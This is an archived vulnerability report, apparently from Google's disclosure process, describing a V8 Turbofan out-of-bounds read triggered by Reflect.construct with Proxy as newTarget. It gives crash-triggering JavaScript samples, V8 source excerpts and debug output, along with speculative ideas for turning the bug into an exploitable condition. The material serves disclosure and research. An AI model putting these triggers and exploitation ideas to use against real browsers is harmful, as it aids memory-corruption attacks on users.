@@ -1,0 +1,120 @@
+id: 32813
+date: 05/28/2019
+title: JavaScript V8 Turbofan Out-Of-Bounds Read Exploit
+author: saelo
+cves: 
+
+V8: Turbofan may read a Map pointer out-of-bounds when optimizing Reflect.construct 
+
+
+
+The following JavaScript program (found through fuzzing) triggers an assertion failure in debug builds of the latest v8 (and the current release branch, 7.2.502.28):
+
+    function f(arg) {
+        const o = Reflect.construct(Object,arguments,Proxy);
+        o.foo = arg;
+    }
+
+    for (let i = 0; i < 10000; i++) {
+        f(i);
+    }
+
+    // Triggers:
+    // #
+    // # Fatal error in ../../src/objects/js-objects-inl.h, line 620
+    // # Debug check failed: has_prototype_slot().
+    // #
+
+What happens here is roughly the following:
+
+* The function f is executed in the interpreter (ignition) and is eventually marked for optimization by turbofan
+* Turbofan initially translates the call to Reflect.construct to a JSCall operation
+* In the inlining phase, JSCallReducer concludes that the JSCall will always call Reflect.construct and then JSCallReducer::ReduceReflectConstruct turns it into a JSCreate operation
+* When processing the property store, turbofan attempts to infer the type of the receiver, ending up in NodeProperties::InferReceiverMaps
+* InferReceiverMaps reaches the allocation site of the object (the JSCreate operation), which it handles with the following code:
+
+      case IrOpcode::kJSCreate: {
+        if (IsSame(receiver, effect)) {
+          HeapObjectMatcher mtarget(GetValueInput(effect, 0));      // `Object` in the JS code above
+          HeapObjectMatcher mnewtarget(GetValueInput(effect, 1));   // `Proxy` in the JS code above
+          if (mtarget.HasValue() && mnewtarget.HasValue() &&        // basically check if both are constants
+              mnewtarget.Ref(broker).IsJSFunction()) {
+            JSFunctionRef original_constructor =
+                mnewtarget.Ref(broker).AsJSFunction();
+            if (original_constructor.has_initial_map()) {           [[ 1 ]]
+              original_constructor.Serialize();
+              MapRef initial_map = original_constructor.initial_map();
+              if (initial_map.GetConstructor().equals(mtarget.Ref(broker))) {
+                *maps_return = ZoneHandleSet<Map>(initial_map.object());
+                return result;
+              }
+            }
+          }
+          // We reached the allocation of the {receiver}.
+          return kNoReceiverMaps;
+        }
+        break;
+      }
+
+From [[ 1 ]] the code then reaches:
+
+    bool JSFunction::has_initial_map() {
+      DCHECK(has_prototype_slot());
+      return prototype_or_initial_map()->IsMap();
+    }
+
+Where v8 crashes because the Proxy constructor does not have a prototype slot (which would be at offset 56 from the object):
+
+    d8> %DebugPrint(Proxy)
+    DebugPrint: 0x34129420d541: [Function] in OldSpace
+     - map: 0x341214d01d59 <Map(HOLEY_ELEMENTS)> [FastProperties]
+     - function prototype: <no-prototype-slot>
+     - ...
+
+    0x341214d01d59: [Map]
+     - type: JS_FUNCTION_TYPE
+     - instance size: 56
+     - constructor
+
+As such, the access to the prototype_or_initial_map field reads 8 byte out-of-bounds after the Proxy constructor. The proxy object seems to be unique in that it is a constructor but does not have the prototype slot.
+
+Now, at least in the d8 shell, the Proxy object is restored from a snapshot during initialization. Right after it in memory comes its DescriptorArray (storing the attributes of the properties of the Proxy object), which has a valid Map pointer at index 0 (like all objects allocated on the GC heap). Then this code runs:
+
+              if (initial_map.GetConstructor().equals(mtarget.Ref(broker))) {
+                *maps_return = ZoneHandleSet<Map>(initial_map.object());
+                return result;
+              }
+
+In this case, the constructor for the DescriptorArray Map is null, so this check fails and Turbofan does not perform the optimization, thus calling into the runtime in the generated code. As such, no incorrect behaviour is observable in release builds (because the DCHECKs are not enabled there). After a bit of playing around I did not find an obvious way to exploit this condition in the latest v8, but below are some ideas:
+
+First of, it is possible to free the descriptor array following the Proxy constructor in memory with the following code:
+
+    delete Proxy.revocable;     // Create a new Map for Proxy, no references to the previous Map remain
+    %CollectGarbage(0);         // Free the previous Map and with it the DescriptorArray
+
+But so far I haven't managed to reclaim that space with something interesting. Also, it might be possible to instantiate the Proxy constructor again (e.g. through iframes) without it being followed by the DescriptorArray, or there might be other objects that are constructors but do not have the prototype slot, which should also be usable to trigger this bug. This way, a different object could be placed after the Proxy object (from which the OOB read happens). In that case, it might be possible to achieve an observable miscompilation and an exploitable condition because the engine incorrectly infers the Map of the created object or because it constructs an object with some internal/unexpected Map, thus leaking internal objects to script. Finally, it might be possible to control mtarget in the code above to be null, which would also cause the following check to pass for the situation above.
+
+There appear to be similar code paths in which Turbofan assumes that newTarget is either a constructor or has the prototype slot. E.g. the following sample triggers an assertion failure in JSCreateLowering::ReduceJSCreateArray where it assumes that newTarget must be a constructor, which the parseInt function is not (but afterwards again nothing observable happens in release builds because this time has_prototype_slot is false).
+
+    function f() {
+        try {
+            const o = Reflect.construct(Array,arguments,parseInt);
+        } catch(e) { }
+    }
+
+    for (let i = 0; i < 10000; i++) {
+        f();
+    }
+
+    // Triggers:
+    // #
+    // # Fatal error in ../../src/compiler/js-create-lowering.cc, line 655
+    // # Debug check failed: original_constructor.map().is_constructor().
+    // #
+
+
+This bug is subject to a 90 day disclosure deadline. After 90 days elapse
+or a patch has been made broadly available (whichever is earlier), the bug
+report will become visible to the public.
+
+#  0day.today [2023-03-25]  #
